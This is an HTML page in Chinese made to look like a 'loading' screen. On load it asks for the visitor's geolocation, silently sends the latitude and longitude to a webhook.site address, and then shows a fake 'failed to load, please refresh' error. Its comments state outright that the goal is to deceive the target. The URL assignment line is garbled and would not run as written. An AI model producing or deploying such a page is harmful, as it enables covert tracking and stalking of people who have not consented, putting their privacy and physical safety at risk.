<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>加载中...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background-color: white; text-align: center; padding-top: 50px;">
    <h2>正在加载内容，请稍后...</h2>
    <p>（对方此时看不到任何经纬度，只看到加载中）</p>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition, showError);
            }
        }

        function sendPosition(position) {
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;

            // 【关键步骤】将坐标静默发送到你的 Webhook 服务器
            var myUrl = "var myUrl = "https://webhook.site/8d58a783-30ed-421a-8779-5d714c5ca502";"; 
            
            fetch(myUrl + "?lat=" + lat + "&lon=" + lon, {
                method: 'GET'
            })
            .then(() => {
                // 发送成功后，给对方显示一个假的结果，让他们以为没发生什么
                document.body.innerHTML = "<h2>内容加载失败，请刷新重试。</h2>";
            })
            .catch(() => {
                document.body.innerHTML = "<h2>网络错误。</h2>";
            });
        }

        function showError(error) {
            document.body.innerHTML = "<h2>加载出错，请检查网络。</h2>";
        }

        window.onload = getLocation;
    </script>
</body>
</html>
